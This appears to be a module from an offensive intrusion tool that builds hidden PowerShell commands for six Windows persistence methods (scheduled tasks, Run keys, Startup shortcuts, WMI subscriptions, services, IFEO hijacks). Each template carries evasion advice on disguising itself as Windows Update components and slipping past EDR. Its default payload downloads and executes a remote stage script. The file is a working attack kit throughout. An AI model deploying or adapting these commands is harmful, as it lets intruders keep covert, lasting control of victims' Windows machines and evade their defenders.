# language: Python 3.11+, file: cf/persistence.py
# *persistence templates — command builders with telemetry/opsec notes*
from __future__ import annotations

from .util import json_dumps

KINDS: dict[str, dict[str, str]] = {
    "schtask": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$a=New-ScheduledTaskAction -Execute 'powershell.exe' "
            "-Argument '-w h -nop -ep bypass -c {payload}';"
            "$t=New-ScheduledTaskTrigger -Daily -At 09:31;"
            "Register-ScheduledTask -TaskPath '\\Microsoft\\Windows\\Update' "
            "-TaskName '{name}' -Action $a -Trigger $t -Description "
            "'Windows Update Maintenance' -Force\""
        ),
        "mitre": "T1053.005",
        "telemetry": "4698, Microsoft-Windows-TaskScheduler/Operational",
        "opsec": (
            "hide inside an existing task folder and reuse a real task's "
            "author/description fields"
        ),
    },
    "run-key": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\"
            "CurrentVersion\\Run' -Name '{name}' "
            "-Value 'powershell -w h -nop -ep bypass -c {payload}'\""
        ),
        "mitre": "T1060",
        "telemetry": "sysmon:12/13, 4670 on HKCU Run",
        "opsec": "run keys are the most-watched persistence hive — pair with a host-lookup delay",
    },
    "startup-lnk": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$s=(New-Object -ComObject WScript.Shell).CreateShortcut("
            "$env:APPDATA + '\\Microsoft\\Windows\\Start Menu\\Programs\\"
            "Startup\\{name}.lnk');"
            "$s.TargetPath='powershell.exe';"
            "$s.Arguments='-w h -nop -ep bypass -c {payload}';"
            "$s.IconLocation='C:\\Windows\\System32\\shell32.dll,10';"
            "$s.Save()\""
        ),
        "mitre": "T1547.009",
        "telemetry": "file-create in Startup folder, sysmon:11",
        "opsec": "icons + metadata must look native; the folder is a top YARA source",
    },
    "wmi-sub": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "$f=Set-WmiInstance -Namespace root\\subscription -Class __EventFilter "
            "-Arguments @{{Name='{name}';EventNamespace='root\\cimv2';"
            "QueryLanguage='WQL';"
            "Query='SELECT * FROM __InstanceModificationEvent WITHIN 106 "
            "WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''}};"
            "$c=Set-WmiInstance -Namespace root\\subscription "
            "-Class CommandLineEventConsumer -Arguments "
            "@{{Name='{name}_c';CommandLineTemplate='{payload}'}};"
            "Set-WmiInstance -Namespace root\\subscription "
            "-Class __FilterToConsumerBinding -Arguments "
            "@{{Filter=$f;Consumer=$c}}\""
        ),
        "mitre": "T1546.003",
        "telemetry": "wmi-activity/Operational, sysmon:19/20/21",
        "opsec": "no file on disk — but event 19/20 is a hard detection, avoid mature EDR estates",
    },
    "service": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "sc.exe create '{name}' binPath= '{payload}' start= auto "
            "obj= .\\LocalSystem DisplayName= '{name} Service';"
            "sc.exe failure '{name}' reset= 86400 actions= restart/60000\""
        ),
        "mitre": "T1543.003",
        "telemetry": "7045, sysmon:1 (sc.exe), 4697",
        "opsec": "system-context — payload must survive reboot; 7045 needs 'new service' cover",
    },
    "ifeo": {
        "command": (
            "powershell -w h -nop -ep bypass -c \""
            "New-Item -Path 'HKLM:\\SOFTWARE\\Microsoft\\Windows NT\\"
            "CurrentVersion\\Image File Execution Options\\{target}.exe' -Force | "
            "New-ItemProperty -Name Debugger -PropertyType String "
            "-Value '{payload}' -Force\""
        ),
        "mitre": "T1546.012",
        "telemetry": "sysmon:13 on IFEO, 4688 hijacked process",
        "opsec": "neighbor .exe must be a plausible accessibility or debug binary",
    },
}


def command(kind: str, **values: str) -> dict[str, str]:
    spec = KINDS.get(kind)
    if spec is None:
        raise KeyError(f"unknown persistence kind: {kind}")
    out = spec["command"].format(
        name=values.get("name", "MicrosoftEdgeUpdateTaskMachineCore"),
        payload=values.get("payload", "iex(iwr '{lure}/stage.ps1')"),
        target=values.get("target", "sethc"),
        **{k: v for k, v in values.items() if k not in ("name", "payload", "target")},
    )
    return {
        "kind": kind,
        "command": out,
        "mitre": spec["mitre"],
        "telemetry": spec["telemetry"],
        "opsec": spec["opsec"],
        "json": json_dumps({"kind": kind, "command": out}),
    }
